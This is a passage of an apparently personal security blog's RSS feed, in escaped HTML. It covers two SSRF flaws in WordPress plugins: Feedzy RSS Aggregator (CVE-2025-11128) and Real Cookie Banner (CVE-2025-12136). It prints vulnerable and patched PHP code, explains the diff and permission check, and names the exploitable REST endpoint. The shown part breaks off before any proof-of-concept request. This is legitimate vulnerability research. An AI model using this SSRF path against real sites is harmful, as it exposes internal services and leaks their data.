2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-11128&lt;/strong&gt; vulnerability in the &lt;strong&gt;Feedzy RSS Aggregator&lt;/strong&gt; plugin stems from unsafe handling of URLs in the &lt;code&gt;/feedzy/v1/feed&lt;/code&gt; REST API. The function &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; only used &lt;code&gt;esc_url()&lt;/code&gt; and did not validate addresses, allowing an attacker with &lt;strong&gt;Subscriber&lt;/strong&gt; privileges to send SSRF requests to internal services.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;strong&gt;5.1.1&lt;/strong&gt; patch fixes this by using &lt;code&gt;wp_http_validate_url()&lt;/code&gt;, tightening API access via &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt; and replacing &lt;code&gt;esc_url()&lt;/code&gt; with &lt;code&gt;esc_url_raw()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;esc_url()&lt;/code&gt; is not sufficient to validate incoming URLs.&lt;/li&gt;&#xA;&lt;li&gt;REST APIs must be properly restricted with appropriate permissions.&lt;/li&gt;&#xA;&lt;li&gt;URLs must be validated and filtered to prevent SSRF to internal networks.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/feedzy-rss-feeds/vulnerability/wordpress-feedzy-rss-feeds-lite-plugin-5-1-0-authenticated-subscriber-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Feedzy Plugin &amp;lt;= 5.1.0 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12136 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-29-cve-2025-12136/</link>
      <pubDate>Wed, 29 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-29-cve-2025-12136/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The Real Cookie Banner: GDPR &amp;amp; ePrivacy Cookie Consent plugin for WordPress is vulnerable to &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; in all versions up to and including 5.2.4. The root cause is insufficient validation of the user-supplied URL at the REST API endpoint &lt;code&gt;/scanner/scan-without-login&lt;/code&gt;. This allows authenticated attackers with administrator-level access to make web requests to arbitrary locations originating from the web application and can be used to query and modify information from internal services via the &lt;code&gt;url&lt;/code&gt; parameter.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12136&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12136&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.2.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.2.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/real-cookie-banner/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Real Cookie Banner Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Real Cookie Banner&lt;/strong&gt;: &lt;strong&gt;5.2.4&lt;/strong&gt; (vulnerable) and &lt;strong&gt;5.2.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to inspect and compare differences between versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function routeScanWithoutLogin($request)&#xA;{&#xA;    $url = $request-&amp;gt;get_param(&amp;#39;url&amp;#39;);&#xA;    $jobId = $request-&amp;gt;get_param(&amp;#39;jobId&amp;#39;);&#xA;    if ($checker-&amp;gt;start($url, \false)) {&#xA;        $requestArguments = $checker-&amp;gt;getRequestArguments();&#xA;        $result = \wp_remote_get($url, [&amp;#39;redirection&amp;#39; =&amp;gt; 0, &amp;#39;cookies&amp;#39; =&amp;gt; $requestArguments[&amp;#39;cookies&amp;#39;], &amp;#39;headers&amp;#39; =&amp;gt; $requestArguments[&amp;#39;headers&amp;#39;], &amp;#39;timeout&amp;#39; =&amp;gt; $requestArguments[&amp;#39;timeout&amp;#39;], &amp;#39;sslverify&amp;#39; =&amp;gt; $requestArguments[&amp;#39;sslverify&amp;#39;]]);&#xA;        $status = \wp_remote_retrieve_response_code($result);&#xA;    &#xA;        $ok = $status &amp;gt;= 200 &amp;amp;&amp;amp; $status &amp;lt; 300;&#xA;        $location = \wp_remote_retrieve_header($result, &amp;#39;Location&amp;#39;);&#xA;        return new WP_REST_Response([&amp;#39;status&amp;#39; =&amp;gt; $status, &amp;#39;statusText&amp;#39; =&amp;gt; \wp_remote_retrieve_response_message($result), &amp;#39;ok&amp;#39; =&amp;gt; $ok, &amp;#39;headers&amp;#39; =&amp;gt; (object) \wp_remote_retrieve_headers($result), &amp;#39;redirected&amp;#39; =&amp;gt; !empty($location), &amp;#39;responseUrl&amp;#39; =&amp;gt; $location, &amp;#39;body&amp;#39; =&amp;gt; \wp_remote_retrieve_body($result)]);&#xA;    } else {&#xA;        return new WP_Error(&amp;#39;rest_scan_without_login_error&amp;#39;, &amp;#39;Loopback request could not be started.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; takes the &lt;code&gt;url&lt;/code&gt; parameter directly from &lt;code&gt;$request-&amp;gt;get_param(&#39;url&#39;)&lt;/code&gt; and uses it in &lt;code&gt;wp_remote_get()&lt;/code&gt; without any validation or filtering =&amp;gt; this leads to a &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;The response packages the full result from &lt;code&gt;wp_remote_get($url)&lt;/code&gt; into JSON:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;status&lt;/code&gt;, &lt;code&gt;statusText&lt;/code&gt;: HTTP status code and message.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ok&lt;/code&gt;: true if status is 2xx.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;headers&lt;/code&gt;: all response headers.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;redirected&lt;/code&gt;, &lt;code&gt;responseUrl&lt;/code&gt;: redirect information if present.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;body&lt;/code&gt;: response body content from the URL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; The server effectively forwards the entire response from the internal URL back to the caller, causing data leakage when SSRF is exploited.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function routeScanWithoutLogin($request)&#xA;{&#xA;    $url = $request-&amp;gt;get_param(&amp;#39;url&amp;#39;);&#xA;    $jobId = $request-&amp;gt;get_param(&amp;#39;jobId&amp;#39;);&#xA;    // Validate that the URL belongs to the jobs&amp;#39; domain to prevent SSRF attacks&#xA;    $jobDataUrl = $job-&amp;gt;data-&amp;gt;url;&#xA;    $parsed_url = \wp_parse_url($url);&#xA;    if (!$parsed_url || !isset($parsed_url[&amp;#39;host&amp;#39;])) {&#xA;        return new WP_Error(&amp;#39;rest_invalid_url&amp;#39;, &amp;#39;Invalid URL provided&amp;#39;);&#xA;    }&#xA;    $current_domain = \wp_parse_url($jobDataUrl, \PHP_URL_HOST);&#xA;    if ($parsed_url[&amp;#39;host&amp;#39;] !== $current_domain) {&#xA;        return new WP_Error(&amp;#39;rest_invalid_domain&amp;#39;, &amp;#39;URL must belong to the jobs\&amp;#39; domain&amp;#39;);&#xA;    }&#xA;    if ($checker-&amp;gt;start($url, \false)) {&#xA;        $requestArguments = $checker-&amp;gt;getRequestArguments();&#xA;        $result = \wp_remote_get($url, [&amp;#39;redirection&amp;#39; =&amp;gt; 0, &amp;#39;cookies&amp;#39; =&amp;gt; $requestArguments[&amp;#39;cookies&amp;#39;], &amp;#39;headers&amp;#39; =&amp;gt; $requestArguments[&amp;#39;headers&amp;#39;], &amp;#39;timeout&amp;#39; =&amp;gt; $requestArguments[&amp;#39;timeout&amp;#39;], &amp;#39;sslverify&amp;#39; =&amp;gt; $requestArguments[&amp;#39;sslverify&amp;#39;]]);&#xA;        $status = \wp_remote_retrieve_response_code($result);&#xA;    &#xA;        $ok = $status &amp;gt;= 200 &amp;amp;&amp;amp; $status &amp;lt; 300;&#xA;        $location = \wp_remote_retrieve_header($result, &amp;#39;Location&amp;#39;);&#xA;        return new WP_REST_Response([&amp;#39;status&amp;#39; =&amp;gt; $status, &amp;#39;statusText&amp;#39; =&amp;gt; \wp_remote_retrieve_response_message($result), &amp;#39;ok&amp;#39; =&amp;gt; $ok, &amp;#39;headers&amp;#39; =&amp;gt; (object) \wp_remote_retrieve_headers($result), &amp;#39;redirected&amp;#39; =&amp;gt; !empty($location), &amp;#39;responseUrl&amp;#39; =&amp;gt; $location, &amp;#39;body&amp;#39; =&amp;gt; \wp_remote_retrieve_body($result)]);&#xA;    } else {&#xA;        return new WP_Error(&amp;#39;rest_scan_without_login_error&amp;#39;, &amp;#39;Loopback request could not be started.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch adds input validation measures to prevent arbitrary URLs:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Extract the job&amp;rsquo;s configured URL&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$jobDataUrl = $job-&amp;gt;data-&amp;gt;url;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Obtain the domain that the job is allowed to operate on.&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Parse and validate the structure of the user-supplied URL&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$parsed_url = \wp_parse_url($url);&#xA;if (!$parsed_url || !isset($parsed_url[&amp;#39;host&amp;#39;])) {&#xA;    return new WP_Error(&amp;#39;rest_invalid_url&amp;#39;, &amp;#39;Invalid URL provided&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Ensure the URL is valid and contains a &lt;code&gt;host&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Compare the host with the job&amp;rsquo;s domain&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$current_domain = \wp_parse_url($jobDataUrl, \PHP_URL_HOST);&#xA;if ($parsed_url[&amp;#39;host&amp;#39;] !== $current_domain) {&#xA;    return new WP_Error(&amp;#39;rest_invalid_domain&amp;#39;, &amp;#39;URL must belong to the jobs\&amp;#39; domain&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; If the host differs, return an error instead of proceeding. This restricts requests to the same allowed domain and prevents SSRF to other systems.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; is registered as the callback for the REST API at &lt;code&gt;/wp-json/&amp;lt;namespace&amp;gt;/scanner/scan-without-login&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    $namespace,&#xA;    &amp;#39;/scanner/scan-without-login&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;GET&amp;#39;,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; [$this, &amp;#39;routeScanWithoutLogin&amp;#39;],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [$this, &amp;#39;permission_callback&amp;#39;],&#xA;        &amp;#39;args&amp;#39;                =&amp;gt; [&#xA;            &amp;#39;url&amp;#39; =&amp;gt; [&#xA;                &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;string&amp;#39;,&#xA;                &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            ],&#xA;            &amp;#39;jobId&amp;#39; =&amp;gt; [&#xA;                &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;number&amp;#39;,&#xA;                &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            ],&#xA;        ],&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The API uses &lt;strong&gt;GET&lt;/strong&gt;, requires two parameters &lt;code&gt;url&lt;/code&gt; (string) and &lt;code&gt;jobId&lt;/code&gt; (number). Access is checked via &lt;code&gt;permission_callback()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const MANAGE_MIN_CAPABILITY = &amp;#39;manage_real_cookie_banner&amp;#39;;&#xA;&#xA;public function permission_callback()&#xA;{&#xA;    return \current_user_can(Core::MANAGE_MIN_CAPABILITY);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://docs.devowl.io/real-cookie-banner/php/classes/DevOwl-RealCookieBanner-Core.html#toc-constants&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;manage_real_cookie_banner&lt;/code&gt;&lt;/a&gt; is by default assigned to &lt;strong&gt;administrator&lt;/strong&gt;, so the endpoint can only be invoked by users with that capability. The full endpoint path can be discovered by visiting &lt;code&gt;/wp-json&lt;/code&gt; and searching for &lt;code&gt;scan-without-login&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/api.png&#34; title=&#34;API containing scan-without-login in /wp-json&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/api.png&#34; data-sub-html=&#34;&lt;h2&gt;API&lt;/h2&gt;&lt;p&gt;API containing scan-without-login in /wp-json&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/api.png&#39; alt=&#34;API&#34; height=&#34;921&#34; width=&#34;1504&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;API containing scan-without-login in /wp-json&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Official endpoint: &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The &lt;code&gt;job&lt;/code&gt; in &lt;code&gt;jobId&lt;/code&gt; suggests a running job tracked by &lt;code&gt;jobId&lt;/code&gt;. I placed a breakpoint in &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; and tested the feature, routing all requests through the BurpSuite proxy. &lt;strong&gt;Scanner&lt;/strong&gt; is the function that calls this API.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/debug.gif&#34; title=&#34;Debugger&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/debug.gif&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/debug.gif&#39; alt=&#34;Debug&#34; height=&#34;1200&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Observing BurpSuite&amp;rsquo;s HTTP history tab shows the request to the API being captured and listed in HTTP History:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/http_history.png&#34; title=&#34;Request to API captured in HTTP History&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/http_history.png&#34; data-sub-html=&#34;&lt;h2&gt;HTTP History&lt;/h2&gt;&lt;p&gt;Request to API captured in HTTP History&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/http_history.png&#39; alt=&#34;HTTP History&#34; height=&#34;704&#34; 